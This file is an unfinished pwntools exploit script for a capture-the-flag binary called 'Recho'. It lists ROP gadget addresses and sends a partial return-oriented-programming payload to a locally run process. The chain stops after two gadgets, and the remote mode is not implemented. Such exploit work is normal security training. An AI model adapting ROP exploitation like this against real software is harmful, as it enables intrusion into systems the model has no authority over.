#!/usr/bin/env python

from pwn import *
import argparse
import sys
import time

context.os="linux"
context.terminal=["tmux","splitw","-h"]
context.arch="amd64"
context.log_level="debug"

def usage():
    print "Usage: {} -d local".format(sys.argv[0])
    exit(-1)

def main():
    parser=argparse.ArgumentParser()
    parser.add_argument("-d", "--debug",type=str,choices=["local","remote"])
    args=parser.parse_args()

    if args.debug=="local":    
        global r
        r=process("./Recho")
        b=ELF("./Recho")
        RDI = 0x00000000004008a3 #: pop rdi ; ret
        RSI = 0x00000000004008a1 #: pop rsi ; pop r15 ; ret
        RDX = 0x00000000004006fe #: pop rdx ; ret
        RAX = 0x00000000004006fc #: pop rax ; ret

        r.recvuntil("server!\n")
        raw_input("[DEBUG]: {}".format(r.proc.pid))
        r.sendline("2000")
        time.sleep(0.5)
        ROP =   ""
        ROP +=  "\x00"*30
        ROP +=  p64(0xdeadbeef)
        ROP += p64(0x000000000040070c) # : xchg eax, ebx ; add byte ptr [rdi], al ; ret
        ROP += p64(0x000000000040070c) # : xchg eax, ebx ; add byte ptr [rdi], al ; ret
        
        
        
        r.sendline(ROP)

    else:
        usage()

if __name__ == '__main__':
    main()